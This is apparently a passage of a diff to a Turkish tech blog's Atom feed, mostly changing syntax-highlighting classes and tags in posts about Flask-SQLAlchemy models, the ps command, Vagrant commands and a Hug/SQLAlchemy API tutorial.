     &lt;span class="n"&gt;organizator&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ForeignKey&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;organization.id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 
 &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;organization&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;organization_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="n"&gt;nullable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;unique&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;organization_desc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="n"&gt;nullable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;organization_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="n"&gt;nullable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;unique&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;organization_desc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="n"&gt;nullable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;organization_img&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
 &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;users&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;usermail&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;unique&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;nullable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;nullable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;usermail&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;unique&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;nullable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;nullable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;eventspeople&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;event_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ForeignKey&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;events.id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
     &lt;span class="n"&gt;users_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ForeignKey&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;users.id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -745,7 +971,7 @@ meminfo()
 
 
 &lt;p&gt;yazarak kodu çalıştırırsanız artık database'iniz oluşturulacak ve işlem yapmaya hazır hale gelecektir.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="images/database.png"&gt;&lt;/p&gt;</content><category term="flask event app"></category><category term="flask sqlalchemy"></category><category term="sqlalchemy"></category><category term="flask mvc"></category><category term="flask"></category></entry><entry><title>PS Komutunun Alabildiği Argümanlar</title><link href="https://enesergun.net/ps-command-arguments.html" rel="alternate"></link><published>2018-02-10T22:19:00+03:00</published><updated>2018-02-10T22:19:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-02-10:/ps-command-arguments.html</id><summary type="html">&lt;p&gt;&lt;strong&gt;PS&lt;/strong&gt; komutu linux üzerinde processleri ( çalışan işlemleri ) monitoring edebileceğimiz bir komuttur. Pek tabi ki bir çok argüman almaktadır. Şimdi bu argümanların en çok kullanılanlarına aşağıda bahsedeceğiz. PS komutu çıktıları bir çok formatta olabiliyor. İyi okumalar.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="images/database.png"&gt;&lt;/p&gt;</content><category term="flask"></category><category term="flask event app"></category><category term="flask sqlalchemy"></category><category term="sqlalchemy"></category><category term="flask mvc"></category><category term="flask"></category></entry><entry><title>PS Komutunun Alabildiği Argümanlar</title><link href="https://enesergun.net/ps-command-arguments.html" rel="alternate"></link><published>2018-02-10T22:19:00+03:00</published><updated>2018-02-10T22:19:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-02-10:/ps-command-arguments.html</id><summary type="html">&lt;p&gt;&lt;strong&gt;PS&lt;/strong&gt; komutu linux üzerinde processleri ( çalışan işlemleri ) monitoring edebileceğimiz bir komuttur. Pek tabi ki bir çok argüman almaktadır. Şimdi bu argümanların en çok kullanılanlarına aşağıda bahsedeceğiz. PS komutu çıktıları bir çok formatta olabiliyor. İyi okumalar.&lt;/p&gt;
 &lt;h3&gt;Let's go&lt;/h3&gt;
 &lt;p&gt;&lt;strong&gt;NOT&lt;/strong&gt;: Önce komutu gösterip daha sonra komutu açıklayacağım bilginize.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ps -A
@@ -842,7 +1068,7 @@ ps axu
 &lt;ul&gt;
 &lt;li&gt;Bu komut ile ps komutu çıktısını sıralayabilirsiniz. Burada -%mem en fazla RAM Kullanan processleri ekrana yazdıracaktır. En az kullananları isterseniz %mem yazabilirsiniz.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img alt="" src="/images/pssort1.png"&gt;&lt;/p&gt;</content><category term="ps cheatsheet"></category><category term="process monitoring on linux"></category><category term="ps aux"></category></entry><entry><title>Vagrant Komutları ( Cheatsheet )</title><link href="https://enesergun.net/vagrant-komutlari.html" rel="alternate"></link><published>2018-01-08T23:12:00+03:00</published><updated>2018-01-08T23:12:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-01-08:/vagrant-komutlari.html</id><summary type="html">&lt;h2&gt;Vagrant Komutları&lt;/h2&gt;
+&lt;p&gt;&lt;img alt="" src="/images/pssort1.png"&gt;&lt;/p&gt;</content><category term="linux"></category><category term="ps cheatsheet"></category><category term="process monitoring on linux"></category><category term="ps aux"></category></entry><entry><title>Vagrant Komutları ( Cheatsheet )</title><link href="https://enesergun.net/vagrant-komutlari.html" rel="alternate"></link><published>2018-01-08T23:12:00+03:00</published><updated>2018-01-08T23:12:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-01-08:/vagrant-komutlari.html</id><summary type="html">&lt;h2&gt;Vagrant Komutları&lt;/h2&gt;
 &lt;p&gt;Selamlar, geçtiğimiz hafta Vagrant ile ilgili bir blog post yayınlamıştım hatırlarsanız. Biraz daha üzerine gitmek istedim. Bu yazıda Vagrant komutlarının kısa açıklamalarına değineceğim.&lt;/p&gt;
 &lt;p&gt;Sayfayı print ederek elinize güzel bir döküman geçmesini amaçlamaktayım.&lt;/p&gt;
 &lt;table&gt;
@@ -1106,7 +1332,7 @@ URL üzerinden direkt olarak bir kutu eklenebilmektedir.&lt;/pre&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt; --ssh &lt;/strong&gt; : SSH paylaşımını açar.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt; --ssh-no-password &lt;/strong&gt; : Bunu bilmiyorum.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt; --ssh-once &lt;/strong&gt; : Yalnızca 1 kerelik SSH bağlantısını açar.&lt;/p&gt;
-&lt;p&gt;Yazımız buraya kadardı. Başka bir yazı da görüşmek üzere esen kalın.&lt;/p&gt;</content><category term="vagrant for beginners"></category><category term="vagrant cheatsheet"></category><category term="vagrant commands"></category><category term="vagrant all commands"></category></entry><entry><title>Neymiş bu Vagrant</title><link href="https://enesergun.net/vagrant-nedir.html" rel="alternate"></link><published>2018-01-06T22:14:00+03:00</published><updated>2018-01-06T22:14:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-01-06:/vagrant-nedir.html</id><summary type="html">&lt;h3&gt;Kısaca Vagrant Nedir?&lt;/h3&gt;
+&lt;p&gt;Yazımız buraya kadardı. Başka bir yazı da görüşmek üzere esen kalın.&lt;/p&gt;</content><category term="vagrant"></category><category term="vagrant for beginners"></category><category term="vagrant cheatsheet"></category><category term="vagrant commands"></category><category term="vagrant all commands"></category></entry><entry><title>Neymiş bu Vagrant</title><link href="https://enesergun.net/vagrant-nedir.html" rel="alternate"></link><published>2018-01-06T22:14:00+03:00</published><updated>2018-01-06T22:14:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2018-01-06:/vagrant-nedir.html</id><summary type="html">&lt;h3&gt;Kısaca Vagrant Nedir?&lt;/h3&gt;
 &lt;p&gt;Kendi anladığım şekilde anlatmam gerekirse Vagrant hazırladığınız text scriptleri ile sanal sunucular oluşturabileceğiniz otomatize bir araçtır. &lt;/p&gt;
 &lt;h3&gt;Ne İşe Yarar?&lt;/h3&gt;
 &lt;p&gt;Oluşturduğunuz scriptler ile herhangi bir ortamda (Müşteri ortamı vs.) sizler için hazır bir makine inşa eder. Tabi bir de &lt;a href="https://ka1nsha.github.io/ansible-nginx.html"&gt;ansible&lt;/a&gt; ile birleştirirseniz tadından yenmez sanırım. Tabi ki bunda …&lt;/p&gt;</summary><content type="html">&lt;h3&gt;Kısaca Vagrant Nedir?&lt;/h3&gt;
@@ -1238,7 +1464,7 @@ Kullanıcılar tarafından oluşturulmuş public kutulara ulaşmak için aşağ�
 &lt;p&gt;&lt;a href="https://2rwky424s9rd179jmbzqsca1-wpengine.netdna-ssl.com/wp-content/uploads/2017/12/vagrant-printerfriendly.png"&gt;Vagrant CheatSheet&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.virtualbox.org/manual/ch08.html"&gt;VBoxManage&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.vagrantup.com/docs/cli/"&gt;Vagrant CLI&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://everythingshouldbevirtual.com/virtualization/vagrant-complex-vagrantfile-configurations/"&gt;Complex VagrantFile&lt;/a&gt;&lt;/p&gt;</content><category term="vagrant"></category><category term="vagrant 101"></category><category term="introduction of vagrant"></category><category term="vagrant dersleri"></category><category term="vagrant nedir"></category></entry><entry><title>Hug ve SQLAlchemy ile Basit API Yapımı</title><link href="https://enesergun.net/hug-sqlalchemy-basit-api.html" rel="alternate"></link><published>2017-09-30T00:59:00+03:00</published><updated>2017-09-30T00:59:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2017-09-30:/hug-sqlalchemy-basit-api.html</id><summary type="html">&lt;p&gt;Selam,&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://everythingshouldbevirtual.com/virtualization/vagrant-complex-vagrantfile-configurations/"&gt;Complex VagrantFile&lt;/a&gt;&lt;/p&gt;</content><category term="vagrant"></category><category term="vagrant"></category><category term="vagrant 101"></category><category term="introduction of vagrant"></category><category term="vagrant dersleri"></category><category term="vagrant nedir"></category></entry><entry><title>Hug ve SQLAlchemy ile Basit API Yapımı</title><link href="https://enesergun.net/hug-sqlalchemy-basit-api.html" rel="alternate"></link><published>2017-09-30T00:59:00+03:00</published><updated>2017-09-30T00:59:00+03:00</updated><author><name>0x656e</name></author><id>tag:enesergun.net,2017-09-30:/hug-sqlalchemy-basit-api.html</id><summary type="html">&lt;p&gt;Selam,&lt;/p&gt;
 &lt;p&gt;Geçenlerde yazı yazdıktan sonra &lt;a href="https://twitter.com/miratcanbayrak"&gt;Mirat Can Bayrak&lt;/a&gt; dedi ki hug ile ilgili birşeyler yazsana. Meğer kendisi üşenmiş. Neyse hug'a gelelim.&lt;/p&gt;
 &lt;p&gt;Google'da hug diye arattığınızda bulamayabilirsiniz. I need hug.&lt;/p&gt;
 &lt;p&gt;Hug'a erişmek için:&lt;/p&gt;
@@ -1276,7 +1502,7 @@ Kullanıcılar tarafından oluşturulmuş public kutulara ulaşmak için aşağ�
 &lt;/ol&gt;
 &lt;p&gt;Tabi siz bunları Tür,Yayıncı vs olarak çoğaltabilirsiniz. Amaç mantığı anlamak.&lt;/p&gt;
 &lt;p&gt;Kodlara geçelim.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy&lt;/span&gt; &lt;span class="kn"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;sa&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;sa&lt;/span&gt;
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy.ext.declarative&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;declarative_base&lt;/span&gt;
 &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy.orm&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;scoped_session&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sessionmaker&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;relationship&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;backref&lt;/span&gt;
 
@@ -1287,16 +1513,16 @@ Kullanıcılar tarafından oluşturulmuş public kutulara ulaşmak için aşağ�
 
 &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Author&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Base&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;__tablename__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;authors&amp;#39;&lt;/span&gt;
-    &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="nb"&gt;id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;primary_key&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Column&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sa&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
     &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__repr__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;Author(name={self.name!r})&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;Author(name=&lt;/span&gt;&lt;span class="si"&gt;{self.name!r}&lt;/span&gt;&lt;span class="s1"&gt;)&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
 
 &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Book&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Base&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
